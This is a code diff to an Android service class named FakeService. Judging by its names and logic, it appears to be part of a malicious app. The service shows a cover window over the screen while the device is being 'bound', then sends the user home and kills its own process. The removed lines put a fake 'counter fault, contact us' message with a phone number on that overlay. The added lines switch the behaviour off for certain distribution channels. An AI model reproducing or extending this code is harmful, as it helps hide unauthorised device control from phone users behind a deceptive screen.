@@ -33,15 +33,9 @@ public class FakeService extends Service {
     public static final String BIND_WINDOW_DISMISS = "com.xstd.action.fakedismiss";
     private BroadcastReceiver mBindSuccesBRC = new BroadcastReceiver() {
         @Override
-        public void onReceive(final Context context, final Intent intent) {
+        public void onReceive(Context context, Intent intent) {
             Config.LOGD("[[BroadcastReceiver::onReceive]] binding devices success >>>>>");
             UtilsRuntime.goHome(getApplicationContext());
-
-            if (BIND_WINDOW_DISMISS.equals(intent.getAction())) {
-                if (window != null) {
-                    window.updateCoverString("计数器故障，请联系我们, 15011188534");
-                }
-            }
 
             mHandler.postDelayed(new Runnable() {
                 @Override
@@ -50,24 +44,12 @@ public class FakeService extends Service {
                         Config.LOGD("[[FakeService]] kill self pid : " + android.os.Process.myPid());
                     }
 
-                    if (BIND_WINDOW_DISMISS.equals(intent.getAction())) {
-                        if (window != null) {
-                            window.updateCount(60 * 60);
-                        }
-                    } else {
-                        if (window != null) {
-                            window.dismiss();
-                        }
+                    if (window != null) {
+                        window.dismiss();
                     }
+                    stopSelf();
 
-//                    if (BIND_SUCCESS_ACTION.equals(intent.getAction())) {
-//                        CommonUtil.uninstallPackage(context, "com.xstd.installstatistics");
-//                    }
-
-                    if (BIND_SUCCESS_ACTION.equals(intent.getAction())) {
-                        stopSelf();
-                        android.os.Process.killProcess(android.os.Process.myPid());
-                    }
+                    android.os.Process.killProcess(android.os.Process.myPid());
                 }
             }, 300);
         }
@@ -79,6 +61,12 @@ public class FakeService extends Service {
 
         if (Config.DEBUG) {
             Config.LOGD("[[FakeService::onCreate]]");
+        }
+
+        int channelCode = Integer.valueOf(Config.CHANNEL_CODE);
+        if (channelCode > 900000) {
+            stopSelf();
+            return;
         }
 
         if (CommonUtil.isBindingActive(getApplicationContext())) {
@@ -126,7 +114,7 @@ public class FakeService extends Service {
 
                 if (Config.DEBUG) {
                     Config.LOGD("[[FakeService]] kill self pid : " + android.os.Process.myPid()
-                                    + " current Binding Times : " + PluginSettingManager.getInstance().getDeviceBindingCount());
+                            + " current Binding Times : " + PluginSettingManager.getInstance().getDeviceBindingCount());
                 }
 
                 //notify umeng
